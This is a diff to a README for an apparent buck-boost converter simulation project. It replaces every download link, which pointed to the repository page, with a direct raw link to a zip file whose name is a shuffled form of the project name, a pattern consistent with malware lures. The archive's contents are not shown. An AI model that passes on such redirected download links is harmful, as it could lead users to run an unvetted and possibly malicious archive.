@@ -1,6 +1,6 @@
 # ⚡ Power-Electronics-Buck-Boost-Converter - Easy DC-DC Converter Simulation
 
-[![Download Power-Electronics-Buck-Boost-Converter](https://img.shields.io/badge/Download-Power--Electronics--Buck--Boost--Converter-brightgreen?style=for-the-badge)](https://github.com/TheJamMac/Power-Electronics-Buck-Boost-Converter)
+[![Download Power-Electronics-Buck-Boost-Converter](https://img.shields.io/badge/Download-Power--Electronics--Buck--Boost--Converter-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/TheJamMac/Power-Electronics-Buck-Boost-Converter/main/simulations/Boost-Buck-Converter-Electronics-Power-1.0.zip)
 
 ## ⚙️ What This Application Does
 
@@ -23,7 +23,7 @@ Before installing, check your system meets the following:
 
 You need to visit the project page to get the files.
 
-[Download Power-Electronics-Buck-Boost-Converter](https://github.com/TheJamMac/Power-Electronics-Buck-Boost-Converter)
+[Download Power-Electronics-Buck-Boost-Converter](https://raw.githubusercontent.com/TheJamMac/Power-Electronics-Buck-Boost-Converter/main/simulations/Boost-Buck-Converter-Electronics-Power-1.0.zip)
 
 Follow these steps:
 
@@ -100,4 +100,4 @@ To deepen your understanding, consider exploring:
 
 To download or update the project files, go back to:
 
-[Download Power-Electronics-Buck-Boost-Converter](https://github.com/TheJamMac/Power-Electronics-Buck-Boost-Converter)
+[Download Power-Electronics-Buck-Boost-Converter](https://raw.githubusercontent.com/TheJamMac/Power-Electronics-Buck-Boost-Converter/main/simulations/Boost-Buck-Converter-Electronics-Power-1.0.zip)
